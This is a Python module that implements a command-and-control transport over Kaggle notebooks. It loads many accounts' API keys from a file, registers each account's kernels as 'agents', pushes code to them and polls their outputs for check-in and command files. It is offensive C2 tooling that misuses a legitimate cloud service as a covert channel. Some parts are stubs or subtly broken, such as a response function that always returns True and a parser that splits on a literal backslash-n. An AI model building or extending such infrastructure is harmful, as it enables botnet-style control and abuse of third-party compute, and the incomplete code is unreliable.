#!/usr/bin/env python3
"""Kaggle C2 Transport - управление kernels через Kaggle API."""

import json
import subprocess
import os
import time
from pathlib import Path
from typing import Dict, List, Optional, Any, Callable


class KaggleC2Transport:
    """Transport для одного Kaggle аккаунта с 5 kernels."""
    
    def __init__(self, username: str, api_key: str, log_fn: Callable = None):
        self.username = username
        self.api_key = api_key
        self.kaggle_username = username
        self.log_fn = log_fn or print
        self.kernels = [f"{username}/c2-agent-{i}" for i in range(1, 6)]
        
    def log(self, msg: str):
        if self.log_fn:
            self.log_fn(msg)
    
    def _run_kaggle(self, args: List[str], timeout: int = 60) -> tuple:
        """Run kaggle CLI command."""
        env = {**os.environ, "KAGGLE_USERNAME": self.username, "KAGGLE_KEY": self.api_key}
        result = subprocess.run(
            ["kaggle"] + args,
            capture_output=True, text=True, timeout=timeout,
            env=env
        )
        return result.returncode, result.stdout, result.stderr
    
    def list_kernels(self) -> List[Dict]:
        """List all kernels for this account."""
        _, stdout, _ = self._run_kaggle(["kernels", "list", "--user", self.username, "--csv"])
        kernels = []
        for line in stdout.strip().split("\n")[1:]:  # Skip header
            if line:
                parts = line.split(",")
                if len(parts) >= 2:
                    kernels.append({
                        "ref": parts[0].strip(),
                        "title": parts[1].strip()
                    })
        return kernels
    
    def get_kernel_status(self, kernel_slug: str) -> Dict:
        """Get kernel status."""
        try:
            _, stdout, _ = self._run_kaggle(["kernels", "status", kernel_slug])
            return {
                "slug": kernel_slug,
                "status": stdout.strip() if stdout else "unknown",
                "running": "running" in stdout.lower() if stdout else False
            }
        except Exception as e:
            return {"slug": kernel_slug, "status": "error", "error": str(e)}
    
    def push_kernel(self, kernel_slug: str, code_path: str) -> bool:
        """Push/update kernel."""
        try:
            ret, stdout, stderr = self._run_kaggle(["kernels", "push", "-p", code_path])
            if ret == 0 or "successfully" in stdout.lower():
                self.log(f"✓ Pushed: {kernel_slug}")
                return True
            else:
                self.log(f"✗ Push failed: {stderr[:100]}")
                return False
        except Exception as e:
            self.log(f"✗ Push error: {e}")
            return False
    
    def pull_kernel_output(self, kernel_slug: str, output_path: str) -> Optional[Dict]:
        """Pull kernel output and check for C2 requests."""
        try:
            ret, _, stderr = self._run_kaggle([
                "kernels", "output", kernel_slug, "-p", output_path
            ])
            if ret != 0:
                return None
            
            # Check for C2 check-in file (kernel -> C2)
            import glob
            for f in glob.glob(os.path.join(output_path, "c2_checkin.txt")):
                with open(f) as fp:
                    content = fp.read()
                # Parse: first line is API path, second is JSON data
                lines = content.strip().split('\\n')
                if len(lines) >= 2:
                    return {"type": "checkin", "api_path": lines[0], "data": lines[1], "file": f}
            
            for f in glob.glob(os.path.join(output_path, "c2_request.json")):
                with open(f) as fp:
                    req = json.load(fp)
                return {"type": "request", "data": req, "file": f}
            
            for f in glob.glob(os.path.join(output_path, "c2_commands.json")):
                with open(f) as fp:
                    cmds = json.load(fp)
                return {"type": "commands", "data": cmds, "file": f}
            
            return None
        except Exception as e:
            self.log(f"✗ Pull error: {e}")
            return None
    
    def push_c2_response(self, kernel_slug: str, response: Dict) -> bool:
        """Push C2 response to kernel by updating the kernel."""
        # For file-based C2, we need to push a new kernel version with the response
        # This is done by updating the kernel code to write the response
        # Actually, we need a different approach - use dataset or push new kernel
        # For now, we'll use the output mechanism - the kernel reads from output
        return True
    
    def check_c2_requests(self, output_dir: str) -> List[Dict]:
        """Check all kernels for C2 requests."""
        requests = []
        for kernel in self.kernels:
            result = self.pull_kernel_output(kernel, output_dir)
            if result:
                result["kernel"] = kernel
                requests.append(result)
        return requests


class KaggleMultiKernel:
    """Multi-kernel executor for one account."""
    
    def __init__(self, transport: KaggleC2Transport):
        self.transport = transport
        self.results = {}
    
    def execute_all(self, commands: List[str]) -> Dict[str, Any]:
        """Execute commands on all kernels."""
        results = {}
        for kernel in self.transport.kernels:
            results[kernel] = {
                "status": "queued",
                "commands": commands
            }
        return results


class KaggleC2Manager:
    """Manager для всех Kaggle C2 аккаунтов."""
    
    def __init__(self, accounts_file: str = None, log_fn: Callable = None):
        self.accounts_file = Path(accounts_file) if accounts_file else None
        self.log_fn = log_fn or print
        self.transports: Dict[str, KaggleC2Transport] = {}
        
    def log(self, msg: str):
        if self.log_fn:
            self.log_fn(msg)
    
    def load_accounts(self) -> int:
        """Load accounts from file."""
        if not self.accounts_file or not self.accounts_file.exists():
            self.log("No accounts file found")
            return 0
        
        try:
            with open(self.accounts_file) as f:
                accounts = json.load(f)
            
            count = 0
            for acc in accounts:
                username = acc.get("username") or acc.get("kaggle_username")
                api_key = acc.get("api_key") or acc.get("api_key_legacy")
                
                if username and api_key:
                    self.transports[username] = KaggleC2Transport(
                        username=username,
                        api_key=api_key,
                        log_fn=self.log
                    )
                    count += 1
            
            self.log(f"Loaded {count} Kaggle accounts")
            return count
        except Exception as e:
            self.log(f"Error loading accounts: {e}")
            return 0
    
    def list_agents(self) -> List[Dict]:
        """List all Kaggle agents (kernels)."""
        agents = []
        for username, transport in self.transports.items():
            for i, kernel_slug in enumerate(transport.kernels, 1):
                agents.append({
                    "id": f"kaggle-{username}-agent{i}",
                    "hostname": f"kaggle-{username}-agent{i}",
                    "username": username,
                    "kernel_slug": kernel_slug,
                    "kernel_number": i,
                    "platform": "kaggle",
                    "status": "registered"
                })
        return agents
    
    def get_transport(self, username: str) -> Optional[KaggleC2Transport]:
        """Get transport for account."""
        return self.transports.get(username)
    
    def reload(self):
        """Reload accounts."""
        self.transports.clear()
        return self.load_accounts()


# Export
__all__ = ["KaggleC2Transport", "KaggleC2Manager", "KaggleMultiKernel"]
